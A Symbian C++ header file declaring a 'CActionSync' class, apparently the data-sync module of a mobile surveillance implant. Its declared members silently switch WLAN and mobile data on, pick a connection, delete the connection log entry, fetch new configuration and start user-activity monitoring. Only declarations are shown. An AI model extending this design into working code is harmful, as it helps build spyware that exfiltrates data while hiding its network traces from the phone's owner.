/*
 ============================================================================
 Name		: ActionSync.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CActionSync declaration
 ============================================================================
 */

#ifndef ACTIONSYNC_H
#define ACTIONSYNC_H

// INCLUDES
#include <HT\Logging.h>
#include <e32std.h>
#include <e32base.h>
#include <es_sock.h>
#include <CommDbConnPref.h> 

#include <COMMDB.H> 
#include <cdbcols.h>

#include <metadatabase.h>				// CMDBSEssion
#include <commsdattypeinfov1_1.h>		// CCDIAPRecord, CCDPRoxiesRecord
#include <commsdattypesv1_1.h>			// KCDTIdIAPRecord,KCDTIdProxyRecord 

#include <es_enum.h>

#include "Protocol.h"
#include "AbstractAction.h"
#include "Monitor.h"

// CLASS DECLARATION

/**
 *  CActionSync
 * 
 */
class CActionSync : public CAbstractAction, public MProtocolNotifier//, public MMonitorObserver
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CActionSync();

	/**
	 * Two-phased constructor.
	 */
	static CActionSync* NewL(const TDesC8& params, TQueueType aQueueType);

	/**
	 * Two-phased constructor.
	 */
	static CActionSync* NewLC(const TDesC8& params, TQueueType aQueueType);

protected:
	// from CAbstractAction
	virtual void DispatchStartCommandL();

private:
	
	/**
	 * Check if there is an active connection.
	 */
	void GetActiveConnectionPrefL(TConnectionInfoBuf& aConnInfo);
	
	/**
	 * Check if aIapId has a configured proxy.
	 */
	TBool HasProxyL(TUint aIapId, CommsDat::CMDBSession *aDbSession);
	
	/**
	 * Check if we are in offline mode.
	 */
	TBool OfflineL();
	
	/**
	 * Search for all suitable access points and create a connections list
	 */
	void GetDefaultConnectionPrefL(TInt& aCount);
	
	/**
	 * Retrieve the access point used for mms sending
	 */
	TInt32 GetMmsAccessPointL();
	
	/*
	 * Set WlanOn if necessary and return need for restoring
	 */
	TBool SetWlanOn();
	
	/*
	 * Set Mobile Data on if necessary and return need for restoring
	 */
	TBool SetMobileDataOn();
	
	/**
	 * Loop through available iap ids and try to connect.
	 */
	TInt ConnectionStartL();
	
	// from MProtocolNotifier
	void ConnectionTerminatedL(TInt aError);
	void NewConfigDownloaded();
	

	/**
	 * Constructor for performing 1st stage construction
	 */
	CActionSync(TQueueType aQueueType);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

private:
	TBool iStopSubactions;
	
	RSocketServ iSocketServ;
	RConnection iConnection; // start sync
	// CProtocol... (iSocketServ / iConnection)
	TBool iUseGPRS;
	TBool iUseWiFi;
	
	TBool iActiveConn;     // is there an active conn?
	TBool iUsableActiveConn;  // can we use it or is it a WAP connection?
	
	THostName iHostName;
	CProtocol* iProtocol;
	
	TBool iStartMonitor;	// start user activity monitoring
	TBool iNewConfig;	 	// a new config has been downloaded
	TBool iDeleteLog;		// connection log entry  must be deleted
	TBool iRestoreWlanOffStatus; // WlanOff status must be restored
	TBool iRestoreMobileDataStatus; //Mobile Data off status must be restored
	
	RArray<TUint32> iIapArray;
	__FLOG_DECLARATION_MEMBER
	
	};

#endif // ACTIONSync_H
